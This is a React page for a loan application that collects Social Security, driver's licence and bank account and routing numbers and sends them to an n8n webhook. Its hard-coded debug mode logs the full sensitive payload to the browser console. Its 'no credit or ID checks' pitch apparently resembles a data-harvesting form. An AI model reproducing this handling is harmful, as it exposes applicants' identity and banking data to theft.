import { useState } from "react";
import { useForm, type FieldErrors } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import applyBg from "@/assets/apply-bg.jpg";
import ApplyFormFields from "@/components/apply/ApplyFormFields";

const applySchema = z.object({
  firstName: z.string().min(1, "Error 1001: First name is required"),
  lastName: z.string().min(1, "Error 1001: Last name is required"),
  email: z.string().min(1, "Error 1001: Email is required").email("Error 1002: Invalid email format — use name@example.com"),
  dateOfBirth: z.string().min(1, "Error 1001: Date of birth is required"),
  socialSecurityNumber: z.string().min(1, "Error 1001: SSN is required").regex(/^\d{3}-\d{2}-\d{4}$/, "Error 1004: SSN must match XXX-XX-XXXX"),
  address: z.string().min(1, "Error 1001: Address is required"),
  city: z.string().min(1, "Error 1001: City is required"),
  state: z.string().min(1, "Error 1001: State is required"),
  zip: z.string().min(1, "Error 1001: ZIP code is required").regex(/^\d{5}(-\d{4})?$/, "Error 1005: ZIP must be 5 digits or ZIP+4"),
  cellPhone: z.string().min(1, "Error 1001: Cell phone is required").regex(/^\(\d{3}\) \d{3}-\d{4}$/, "Error 1003: Phone must match (XXX) XXX-XXXX"),
  driversLicenseNumber: z.string().min(1, "Error 1001: Driver's license number is required"),
  driversLicenseState: z.string().min(1, "Error 1001: Driver's license state is required"),
  bestTimeToCall: z.string().optional(),
  howLongAtAddress: z.string().optional(),
  employerName: z.string().min(1, "Error 1001: Employer name is required"),
  employmentStatus: z.string().optional(),
  hasCoApplicant: z.string().optional(),
  howLongEmployed: z.string().optional(),
  employerName2: z.string().optional(),
  workPhoneNumber: z.string().optional(),
  workPhoneNumber2: z.string().optional(),
  employerPhoneNumber: z.string().optional(),
  employerPhoneNumber2: z.string().optional(),
  employerAddress: z.string().optional(),
  employerCity: z.string().optional(),
  employerZip: z.string().optional(),
  supervisorName: z.string().optional(),
  loanAmount: z.string().optional(),
  loanPurpose: z.string().min(1, "Error 1001: Loan purpose is required"),
  hasDirectDeposit: z.string().optional(),
  hasPaydayLoans: z.string().optional(),
  numberOfPaydayLoans: z.string().optional(),
  incomeSource: z.string().optional(),
  bankName: z.string().min(1, "Error 1001: Bank name is required"),
  accountNumber: z.string().min(1, "Error 1001: Account number is required"),
  routingNumber: z.string().min(1, "Error 1001: Routing number is required"),
  paymentFrequency: z.string().optional(),
  militaryAffiliation: z.string().optional(),
});

export type ApplyFormData = z.infer<typeof applySchema>;

const WEBHOOK_URL = "https://annettepartida.app.n8n.cloud/webhook/loan-application";
const DEBUG_MODE = true; // Toggle to false to disable debug logging

const Apply = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
  const [submitError, setSubmitError] = useState<string | null>(null);

  const form = useForm<ApplyFormData>({
    resolver: zodResolver(applySchema),
    defaultValues: {
      firstName: "", lastName: "", email: "", dateOfBirth: "",
      socialSecurityNumber: "", address: "", city: "", state: "", zip: "",
      cellPhone: "", driversLicenseNumber: "", driversLicenseState: "",
      bestTimeToCall: "", howLongAtAddress: "", employerName: "",
      employmentStatus: "", hasCoApplicant: "", howLongEmployed: "",
      employerName2: "", workPhoneNumber: "", workPhoneNumber2: "",
      employerPhoneNumber: "", employerPhoneNumber2: "",
      employerAddress: "", employerCity: "", employerZip: "",
      supervisorName: "", loanAmount: "", loanPurpose: "",
      hasDirectDeposit: "", hasPaydayLoans: "", numberOfPaydayLoans: "",
      incomeSource: "", bankName: "", accountNumber: "", routingNumber: "",
      paymentFrequency: "", militaryAffiliation: "",
    },
  });

  const onValidationError = (errors: FieldErrors<ApplyFormData>) => {
    const firstKey = Object.keys(errors)[0];
    if (firstKey) {
      setTimeout(() => {
        const el = document.querySelector(`[name="${firstKey}"]`);
        if (el) {
          el.scrollIntoView({ behavior: "smooth", block: "center" });
          (el as HTMLElement).focus();
        }
      }, 100);
    }
  };

  const onSubmit = async (data: ApplyFormData) => {
    setIsSubmitting(true);
    setSubmitStatus("idle");
    setSubmitError(null);

    const payload = {
      firstName: data.firstName,
      lastName: data.lastName,
      email: data.email,
      dateOfBirth: data.dateOfBirth,
      socialSecurityNumber: data.socialSecurityNumber,
      address: data.address,
      city: data.city,
      state: data.state,
      zip: data.zip,
      cellPhone: data.cellPhone,
      driversLicenseNumber: data.driversLicenseNumber,
      driversLicenseState: data.driversLicenseState,
      bestTimeToCall: data.bestTimeToCall || "",
      howLongAtAddress: data.howLongAtAddress || "",
      employerName: data.employerName,
      employmentStatus: data.employmentStatus || "",
      hasCoApplicant: data.hasCoApplicant || "",
      howLongEmployed: data.howLongEmployed || "",
      workPhoneNumber: data.workPhoneNumber || "",
      workPhoneNumber2: data.workPhoneNumber2 || "",
      employerPhoneNumber: data.employerPhoneNumber || "",
      employerPhoneNumber2: data.employerPhoneNumber2 || "",
      employerAddress: data.employerAddress || "",
      employerCity: data.employerCity || "",
      employerZip: data.employerZip || "",
      supervisorName: data.supervisorName || "",
      loanAmount: data.loanAmount || "",
      loanPurpose: data.loanPurpose,
      hasDirectDeposit: data.hasDirectDeposit || "",
      hasPaydayLoans: data.hasPaydayLoans || "",
      numberOfPaydayLoans: data.numberOfPaydayLoans || "",
      incomeSource: data.incomeSource || "",
      bankName: data.bankName,
      accountNumber: data.accountNumber,
      routingNumber: data.routingNumber,
      paymentFrequency: data.paymentFrequency || "",
      militaryAffiliation: data.militaryAffiliation || "",
      source: "lovable_form",
      submitted_at: new Date().toISOString(),
    };

    if (DEBUG_MODE) {
      console.log("[FOX-DEBUG] URL:", WEBHOOK_URL);
      console.log("[FOX-DEBUG] Method: POST");
      console.log("[FOX-DEBUG] Headers:", { "Content-Type": "application/json", Accept: "application/json" });
      console.log("[FOX-DEBUG] Payload:", JSON.stringify(payload, null, 2));
    }

    let lastError: string | null = null;

    // Try JSON first, fall back to form-urlencoded if CORS blocks preflight
    const trySubmit = async (useFormEncoded: boolean): Promise<Response> => {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      try {
        let fetchOptions: RequestInit;

        if (useFormEncoded) {
          const formBody = new URLSearchParams();
          Object.entries(payload).forEach(([key, val]) => formBody.append(key, String(val)));
          fetchOptions = {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formBody.toString(),
            signal: controller.signal,
          };
        } else {
          fetchOptions = {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Accept: "application/json",
            },
            body: JSON.stringify(payload),
            signal: controller.signal,
          };
        }

        if (DEBUG_MODE) {
          console.log(`[FOX-DEBUG] Attempt (${useFormEncoded ? "form-urlencoded" : "JSON"}):`);
          console.log("[FOX-DEBUG] URL:", WEBHOOK_URL);
          console.log("[FOX-DEBUG] Headers:", fetchOptions.headers);
          console.log("[FOX-DEBUG] Body:", fetchOptions.body);
        }

        const response = await fetch(WEBHOOK_URL, fetchOptions);
        clearTimeout(timeoutId);

        if (DEBUG_MODE) {
          console.log("[FOX-DEBUG] Status:", response.status);
          try {
            const text = await response.clone().text();
            console.log("[FOX-DEBUG] Response:", text);
          } catch {}
        }

        return response;
      } catch (err) {
        clearTimeout(timeoutId);
        throw err;
      }
    };

    for (let attempt = 0; attempt < 2; attempt++) {
      try {
        // First attempt: JSON. If CORS fails, retry with form-urlencoded
        const response = await trySubmit(attempt > 0);

        if (response.ok) {
          setSubmitStatus("success");
          form.reset();
          window.scrollTo({ top: 0, behavior: "smooth" });
          setIsSubmitting(false);
          return;
        }

        lastError = `Error 2002: Submission failed (HTTP ${response.status}). Please try again or call (314) 436-5600.`;
        break;
      } catch (err) {
        if (err instanceof DOMException && err.name === "AbortError") {
          lastError = "Error 2003: Request timed out (15 s). Please check your connection and try again.";
          if (DEBUG_MODE) console.log(`[FOX-DEBUG] Attempt ${attempt + 1}: Timeout`);
        } else {
          lastError = "Error 2001: Could not reach the server. Please check your connection and try again.";
          if (DEBUG_MODE) console.log(`[FOX-DEBUG] Attempt ${attempt + 1}: Network error`, err);
        }
        if (attempt === 0) {
          if (DEBUG_MODE) console.log("[FOX-DEBUG] Retrying with form-urlencoded...");
          continue;
        }
      }
    }

    setSubmitStatus("error");
    setSubmitError(lastError);
    setIsSubmitting(false);
  };

  return (
    <div className="min-h-screen">
      <Header />
      <main
        className="relative pt-20"
        style={{
          backgroundImage: `linear-gradient(rgba(55, 75, 90, 0.88), rgba(55, 75, 90, 0.88)), url(${applyBg})`,
          backgroundAttachment: "fixed",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        <div className="py-16 md:py-24">
          <div className="max-w-[700px] mx-auto px-5 md:px-6">
            {/* Form Header */}
            <div className="text-center mb-12 animate-fade-in">
              <h1 className="text-4xl md:text-5xl font-serif text-white mb-6">
                Apply Today
              </h1>
              <p className="text-white/85 text-base md:text-lg leading-relaxed mb-6">
                Our application process is quick and secure. Fill out the form below to get started. We review each application with care and fairness. You can expect a response within one business day, and we're here to answer any questions you may have.
              </p>
              <p className="text-white/75 text-sm md:text-base italic leading-relaxed">
                Please note: We do not conduct credit or ID checks as we wish to treat your application with fairness & respect. You can feel secure in submitting your personal details to us as personal.
              </p>
            </div>

            {/* Status Messages */}
            {submitStatus === "success" && (
              <div className="mb-8 p-6 rounded-xl bg-green-500/20 border border-green-400/40 text-center animate-fade-in">
                <p className="text-white font-semibold text-lg mb-2">Thank You!</p>
                <p className="text-white/90">
                  Your application has been submitted. We'll review it and get back to you within one business day.
                </p>
              </div>
            )}

            {submitStatus === "error" && (
              <div className="mb-8 p-6 rounded-xl bg-red-500/20 border border-red-400/40 text-center animate-fade-in">
                <p className="text-white font-semibold text-lg mb-2">Submission Error</p>
                <p className="text-white/90">
                  {submitError || "There was an error submitting your application."}{" "}
                  Call us at <a href="tel:3144365600" className="underline">(314) 436-5600</a> if the problem persists.
                </p>
              </div>
            )}

            {/* Form */}
            <form onSubmit={form.handleSubmit(onSubmit, onValidationError)} className="space-y-8">
              <ApplyFormFields form={form} />

              {/* Submit */}
              <div className="text-center pt-4">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="btn-primary min-w-[200px] text-lg disabled:opacity-60 disabled:cursor-not-allowed disabled:hover:scale-100"
                >
                  {isSubmitting ? "Submitting..." : "Send"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Apply;
